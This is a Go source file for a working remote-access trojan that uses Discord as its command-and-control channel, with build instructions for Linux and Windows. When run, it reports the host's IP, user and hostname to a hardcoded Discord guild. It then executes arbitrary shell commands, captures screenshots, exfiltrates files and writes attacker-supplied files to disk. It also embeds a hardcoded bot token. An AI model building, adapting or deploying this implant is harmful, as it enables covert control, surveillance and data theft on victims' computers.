// Discord C2
// William Moody
// 08.12.2022

// 🏃‍♂️ <command>      - Run the given command (Windows: cmd.exe, Other: bash)
// 📸                - Take a screenshot
// 👇 <path>         - Download the given file (Less than 8MB)
// ☝️ <path> *attach - Upload the attached file (Less than 8MB)
// 💀                - Kill the process

// Linux   - GOOS=linux GOARCH=amd64 go build client.go
// Windows - GOOS=windows GOARCH=amd64 go build client.go

package main

import (
	"fmt"
	"image/png"
	"io"
	"os"
	"os/signal"
	"os/exec"
	"os/user"
	"math/rand"
	"net"
	"net/http"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
	"github.com/bwmarrin/discordgo"
)

var myChannelId string // Global variable

func getTmpDir() string {
	if runtime.GOOS == "windows" {
		return "C:\\Windows\\Tasks\\"
	} else {
		return "/tmp/"
	}
}

func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignores messages in other channels and own messages
	if m.ChannelID != myChannelId || m.Author.ID == s.State.User.ID {
		return
	}

	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐") // Processing...
	flag := 0

	//Run command
	if strings.HasPrefix(m.Content, "🏃‍♂️") {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("C:\\Windows\\System32\\cmd.exe", "/k", m.Content[14:len(m.Content)])
		} else {
			cmd = exec.Command("/bin/bash", "-c", m.Content[14:len(m.Content)])
		}
		out, err := cmd.CombinedOutput()
		if err != nil {
			out = append(out, 0x0a)
			out = append(out, []byte(err.Error())...)
		}

		var resp strings.Builder
		resp.WriteString("```bash\n")
		resp.WriteString(string(out) + "\n")
		resp.WriteString("```")

		// Message is too long, save as file
		if (len(resp.String()) > 2000-13) {
			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
			f.Write(out)
			fileName := f.Name()
			f.Close()

			f, _ = os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		} else {
			s.ChannelMessageSendReply(m.ChannelID, resp.String(), m.Reference())
		}
		flag = 1
	} else if m.Content == "📸" {
		n := screenshot.NumActiveDisplays()
		for i := 0; i < n; i++ {
			bounds := screenshot.GetDisplayBounds(i)
			img, _ := screenshot.CaptureRect(bounds)

			fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
			file, _ := os.Create(fileName)
			png.Encode(file, img)
			defer file.Close()

			f, _ := os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		}
		flag = 1
	} else if strings.HasPrefix(m.Content, "👇") {
		fileName := m.Content[5:len(m.Content)]
		f, _ := os.Open(fileName)
		fi, _ := f.Stat()
		defer f.Close()
		if fi.Size() < 8388608 { // 8MB file limit
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
			flag = 1
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "File is bigger than 8MB 😔", m.Reference())
		}
	} else if strings.HasPrefix(m.Content, "☝️") {
		path := m.Content[7:len(m.Content)]
		if len(m.Attachments) > 0 {
			out, _ := os.Create(path)
			defer out.Close()
			resp, _ := http.Get(m.Attachments[0].URL)
			defer resp.Body.Close()
			io.Copy(out, resp.Body)
			s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to " + path, m.Reference())
		}
		flag = 1
	} else if m.Content == "💀" {
		flag = 2
	}

	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
	if flag > 0 {
		s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
		if flag > 1 {
			s.Close()
			os.Exit(0)
		}
	}
}

func main() {
    dg, err := discordgo.New("Bot MTA1MDM3MjkyMDQwNjQ1NDMyMg.G4hOeG.wdXB96Wj537-4xP3dA9kGMxvc0pivGFuWERKIs") // Hardcoded bot token
    if err != nil {
		// Error creating Discord session
        return
    }

	// Handler for CreateMessage events
    dg.AddHandler(handler)
    dg.Identify.Intents = discordgo.IntentsGuildMessages

    err = dg.Open()
    if err != nil {
		// Error opening connection
        return
    }

	// Create new channel
	rand.Seed(time.Now().UnixNano())
	sessionId := fmt.Sprintf("sess-%d", rand.Intn(9999 - 1000) + 1000)
	c, _ := dg.GuildChannelCreate("1050375937218318376", sessionId, 0) // Guild ID is hardcoded
	myChannelId = c.ID

	// Send first message with basic info (and pin it)
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	cwd, _ := os.Getwd()
	conn, _ := net.Dial("udp", "8.8.8.8:80")
    defer conn.Close()
    localAddr := conn.LocalAddr().(*net.UDPAddr)
	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n**IP**: %s\n**User**: %s\n**Hostname**: %s\n**OS**: %s\n**CWD**: %s", sessionId, localAddr.IP, currentUser.Username, hostname, runtime.GOOS, cwd)
	m, _ := dg.ChannelMessageSend(myChannelId, firstMsg)
	dg.ChannelMessagePin(myChannelId, m.ID)

    // Bot is now running (CTRL+C to quit)
    sc := make(chan os.Signal, 1)
    signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
    <-sc

    dg.Close()
}
